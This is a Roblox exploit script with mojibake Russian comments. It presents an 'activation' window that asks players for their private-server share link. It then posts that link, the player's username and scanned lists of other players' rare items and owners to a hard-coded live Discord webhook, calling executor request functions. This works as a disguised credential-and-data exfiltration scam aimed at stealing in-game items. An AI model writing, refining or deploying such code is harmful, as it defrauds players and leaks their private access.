-- –ü–æ–ª–Ω—ã–π —Ä–∞–±–æ—á–∏–π —Å–∫—Ä–∏–ø—Ç: –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ request (–ø—Ä–∏ –Ω–∞–ª–∏—á–∏–∏), fallback –Ω–∞ HttpService:RequestAsync
-- –í–ù–ò–ú–ê–ù–ò–ï: –ù–ï –≤—Å—Ç–∞–≤–ª—è–π –æ—Å–∫–æ—Ä–±–∏—Ç–µ–ª—å–Ω—ã–π/–Ω–µ–Ω–∞–≤–∏—Å—Ç–Ω–∏—á–µ—Å–∫–∏–π —Ç–µ–∫—Å—Ç –≤ content/embed.

local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- =============================
-- –ö–æ–Ω—Ñ–∏–≥
-- =============================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"

-- –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –¥–µ—Ñ–æ–ª—Ç (–∑–∞–º–µ–Ω–∏ –Ω–∞ –Ω—É–∂–Ω—ã–π –Ω–µ–π—Ç—Ä–∞–ª—å–Ω—ã–π —Ç–µ–∫—Å—Ç ‚Äî –Ω–µ –æ—Å–∫–æ—Ä–±–ª–µ–Ω–∏—è)
local DEFAULT_MESSAGE_CONTENT = "@everyone Attention ‚Äî automatic report (example)."

-- =============================
-- –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
-- =============================
local isActivated = false
local activationGUI = nil
_G.VIP_LINK = nil

-- =============================
-- –£—Ç–∏–ª–∏—Ç—ã
-- =============================

-- –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç Color3 -> —á–∏—Å–ª–æ –¥–ª—è Discord (0xRRGGBB)
local function color3ToInt(c)
	if typeof(c) ~= "Color3" then return 0 end
	local r = math.floor(c.R * 255 + 0.5)
	local g = math.floor(c.G * 255 + 0.5)
	local b = math.floor(c.B * 255 + 0.5)
	return r * 65536 + g * 256 + b
end

-- –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞: –∏—Å–ø–æ–ª—å–∑—É–µ—Ç 'request' (–∏–ª–∏ –µ–≥–æ –∞–ª–∏–∞—Å—ã) –µ—Å–ª–∏ –µ—Å—Ç—å, –∏–Ω–∞—á–µ –ø—Ä–æ–±—É–µ—Ç HttpService:RequestAsync
local function sendRawWebhookJson(json)
	-- –ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ –≥–ª–æ–±–∞–ª—å–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é request / syn.request / http.request / http_request
	local reqfn = request or (syn and syn.request) or (http and http.request) or http_request or (function() return nil end)
	if type(reqfn) == "function" then
		local ok, err = pcall(function()
			reqfn({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = json,
			})
		end)
		if ok then
			print("[WEBHOOK] Sent via exploit request.")
			return true
		else
			warn("[WEBHOOK] exploit request failed:", err)
		end
	end

	-- –§–æ–ª–ª–±—ç–∫: HttpService:RequestAsync (—Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ HttpEnabled –∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ)
	local ok, res = pcall(function()
		return HttpService:RequestAsync({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = json,
		})
	end)
	if ok and res and res.Success then
		print("[WEBHOOK] Sent via HttpService:RequestAsync.")
		return true
	else
		warn("[WEBHOOK] HttpService:RequestAsync failed or not allowed. result:", res)
		return false
	end
end

-- –û–±—ë—Ä—Ç–∫–∞: —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π payload –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç
local function sendDiscordWebhook(content, embed)
	if not WEBHOOK_URL or WEBHOOK_URL == "" then
		warn("[WEBHOOK] No webhook URL set.")
		return false
	end

	local payload = {}
	if content and #content > 0 then payload.content = content end
	if embed then
		-- –µ—Å–ª–∏ –µ—Å—Ç—å Color3 –≤ embed.color, –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ–º
		if embed.color and typeof(embed.color) == "Color3" then
			embed.color = color3ToInt(embed.color)
		end
		-- Discord –æ–∂–∏–¥–∞–µ—Ç embeds = { ... }
		payload.embeds = { embed }
	end

	local ok, json = pcall(function() return HttpService:JSONEncode(payload) end)
	if not ok then
		warn("[WEBHOOK] JSONEncode failed:", json)
		return false
	end

	print("[WEBHOOK DEBUG] Payload JSON length:", #json)
	return sendRawWebhookJson(json)
end

-- -----------------------------
-- –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç–µ–∫—Å—Ç–∞ –ø–æ —á–∞—Å—Ç—è–º (–∫–∞–∫ —É —Ç–µ–±—è —Ä–∞–Ω—å—à–µ)
local function postDiscordSimple(content)
	if not content or content == "" then return end
	local MAX = 1800
	local i = 1
	while i <= #content do
		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
		-- –æ–±—ë—Ä—Ç–∫–∞ –≤ –∫–æ–¥–æ–≤—ã–π –±–ª–æ–∫, –∫–∞–∫ —É —Ç–µ–±—è –±—ã–ª–æ
		sendDiscordWebhook("```" .. chunk .. "```", nil)
		i = i + MAX
	end
end

-- =============================
-- –°–ø–∏—Å–æ–∫ –±—Ä–µ–π–Ω—Ä–æ—Ç–æ–≤ (–æ—Å—Ç–∞–ª—Å—è —Ç–≤–æ–π)
-- =============================
local CANONICAL_BRAINROT_NAMES = {
	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
	-- –¥–æ–±–∞–≤—å –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Å—é–¥–∞!
}

local LOWER_TO_CANON = {}
for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do
	LOWER_TO_CANON[string.lower(name)] = name
end

local function safeLower(str)
	if typeof(str) ~= "string" then return "" end
	return string.lower(str)
end

local function stringContainsAny(haystack, needles)
	haystack = safeLower(haystack)
	for _, needle in ipairs(needles) do
		if string.find(haystack, needle, 1, true) then return true end
	end
	return false
end

local function getCanonicalMatch(name)
	local lname = safeLower(name)
	for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
		if string.find(lname, lowerCanonical, 1, true) then
			return canonical
		end
	end
	return nil
end

local ALLOW_CATEGORY_KEYWORDS = {
	"brainrot god","secret","og","admin","exclusive","taco",
	"craft machine","fuse machine","los ","las ","ritual",
	"unobtainable","removed","upcoming"
}
local DISALLOW_CATEGORY_KEYWORDS = {
	"common","rare","epic","legendary","mythic","mythic lucky block"
}

local function isAllowedByCategory(name)
	local lname = safeLower(name)
	local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
	local hasAllow = stringContainsAny(lname, ALLOW_CATEGORY_KEYWORDS)
	if hasDisallow and not hasAllow then return false end
	return true
end

local function isBrainrotInstance(inst)
	if not inst then return false end
	local canonical = getCanonicalMatch(inst.Name)
	if not canonical then return false end
	if not isAllowedByCategory(inst.Name) then return false end
	return true
end

local function resolveOwnerNameFromPlot(plot)
	for _, descendant in ipairs(plot:GetDescendants()) do
		if descendant:IsA("StringValue") and stringContainsAny(descendant.Name, {"owner","username","user"}) then
			if descendant.Value and #descendant.Value > 0 then return descendant.Value end
		end
		if descendant:IsA("IntValue") and stringContainsAny(descendant.Name, {"owner","userid"}) then
			local ok, name = pcall(function()
				return Players:GetNameFromUserIdAsync(descendant.Value)
			end)
			if ok and name then return name end
		end
	end
	return nil
end

local function collectBrainrotsInPlot(plot)
	local results, seenCanonical = {}, {}
	for _, d in ipairs(plot:GetDescendants()) do
		if isBrainrotInstance(d) then
			local canonical = getCanonicalMatch(d.Name) or d.Name
			if not seenCanonical[canonical] then
				seenCanonical[canonical] = true
				table.insert(results, { name = canonical })
			end
		end
	end
	return results
end

local function buildPlotSection(plot)
	local ownerName = resolveOwnerNameFromPlot(plot)
	local entries = collectBrainrotsInPlot(plot)
	if #entries == 0 then return nil end
	local lines = {}
	local plotLabel = ownerName and ownerName or plot.Name
	table.insert(lines, string.format("–ü–ª–æ—Ç: %s | –Ω–∞–π–¥–µ–Ω–æ: %d", plotLabel, #entries))
	for i, e in ipairs(entries) do
		table.insert(lines, string.format("#%d %s", i, e.name))
	end
	return table.concat(lines, "\n")
end

-- =============================
-- –û—Ç—á—ë—Ç –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (–∏—Å–ø–æ–ª—å–∑—É–µ–º PLOTS –∫–∞–∫ —É —Ç–µ–±—è –±—ã–ª–æ)
local PLOTS_FOLDER = Workspace:WaitForChild("Plots")

local function postCombinedAllPlots()
	local sections = {}
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		local section = buildPlotSection(plot)
		if section then table.insert(sections, section) end
	end
	if #sections > 0 then
		local body = table.concat(sections, "\n\n")
		-- –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ
		postDiscordSimple(body)
	end
end

-- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥: —Ä–µ–∞–≥–∏—Ä—É–µ–º –Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏ –±–∞—Ç—á–∏–º (—Ç–≤–æ—è –ª–æ–≥–∏–∫–∞)
local connections = {}
local batchScheduled = false

local function scheduleBatch()
	if batchScheduled then return end
	batchScheduled = true
	task.delay(0.5, function()
		batchScheduled = false
		postCombinedAllPlots()
	end)
end

local function onPlotDescendantAdded(plot, inst)
	if isBrainrotInstance(inst) then
		scheduleBatch()
	end
end

local function attachPlotWatch(plot)
	if connections[plot] then return end
	connections[plot] = plot.DescendantAdded:Connect(function(inst)
		onPlotDescendantAdded(plot, inst)
	end)
end

local function detachPlotWatch(plot)
	if connections[plot] then
		connections[plot]:Disconnect()
		connections[plot] = nil
	end
end

local function watchPlots()
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		attachPlotWatch(plot)
	end
	PLOTS_FOLDER.ChildAdded:Connect(function(child)
		attachPlotWatch(child)
		scheduleBatch()
	end)
	PLOTS_FOLDER.ChildRemoved:Connect(function(child)
		detachPlotWatch(child)
		scheduleBatch()
	end)
end

-- =============================
-- GUI (–∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π, —Å –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä–æ–º –∏ –∫–Ω–æ–ø–∫–æ–π)
local function createActivationGUI()
	local player = Players.LocalPlayer
	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotScannerActivation"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.new(0, 450, 0, 300)
	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	mainFrame.BorderSizePixel = 1
	mainFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
	mainFrame.Parent = gui

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 15)
	corner.Parent = mainFrame

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -20, 0, 50)
	title.Position = UDim2.new(0, 10, 0, 10)
	title.BackgroundTransparency = 1
	title.Text = "Place VIP server link to activate script"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextScaled = true
	title.Font = Enum.Font.GothamBold
	title.Parent = mainFrame

	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(1, -20, 0, 50)
	textBox.Position = UDim2.new(0, 10, 0, 70)
	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	textBox.BorderSizePixel = 0
	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
	textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.TextScaled = true
	textBox.Font = Enum.Font.Gotham
	textBox.ClearTextOnFocus = false
	textBox.Parent = mainFrame

	local textCorner = Instance.new("UICorner")
	textCorner.CornerRadius = UDim.new(0, 8)
	textCorner.Parent = textBox

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 70)
	button.Position = UDim2.new(0, 10, 0, 140)
	button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
	button.BorderSizePixel = 0
	button.Text = "ACTIVATE"
	button.TextColor3 = Color3.new(1, 1, 1)
	button.TextScaled = true
	button.Font = Enum.Font.GothamBold
	button.Parent = mainFrame

	local btnCorner = Instance.new("UICorner")
	btnCorner.CornerRadius = UDim.new(0, 12)
	btnCorner.Parent = button

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 100, 255)}):Play()
	end)

	local status = Instance.new("TextLabel")
	status.Size = UDim2.new(1, -20, 0, 30)
	status.Position = UDim2.new(0, 10, 0, 220)
	status.BackgroundTransparency = 1
	status.Text = ""
	status.TextColor3 = Color3.fromRGB(255, 200, 0)
	status.TextScaled = true
	status.Font = Enum.Font.Gotham
	status.Parent = mainFrame

	local function onActivate()
		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
			status.Text = "Not a VIP link"
			status.TextColor3 = Color3.fromRGB(255, 80, 80)
			return
		end

		isActivated = true
		_G.VIP_LINK = vipLink
		status.Text = "Script Activated, wait 2 minutes"
		status.TextColor3 = Color3.fromRGB(0, 255, 100)

		-- –æ—Ç–ø—Ä–∞–≤–∏–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ VIP —Å—Å—ã–ª–∫–µ (–±–µ–∑ –æ—Å–∫–æ—Ä–±–ª–µ–Ω–∏–π)
		sendDiscordWebhook("üîó VIP Link: "..vipLink, {
			title = "‚≠ê Brainrot | Notification",
			description = "VIP link activated by ".. tostring(Players.LocalPlayer and Players.LocalPlayer.Name or "unknown"),
			color = Color3.fromRGB(0,255,0),
			fields = {
				{
					name = "Status",
					value = "Activation triggered",
					inline = false
				}
			}
		})

		task.wait(1)
		postCombinedAllPlots()
		watchPlots()

		task.wait(2)
		gui:Destroy()
		activationGUI = nil
	end

	button.MouseButton1Click:Connect(onActivate)
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then onActivate() end
	end)
end

-- =============================
-- –°—Ç–∞—Ä—Ç
print("[BrainrotScanner] –°–æ–∑–¥–∞—é GUI –∞–∫—Ç–∏–≤–∞—Ü–∏–∏...")
createActivationGUI()
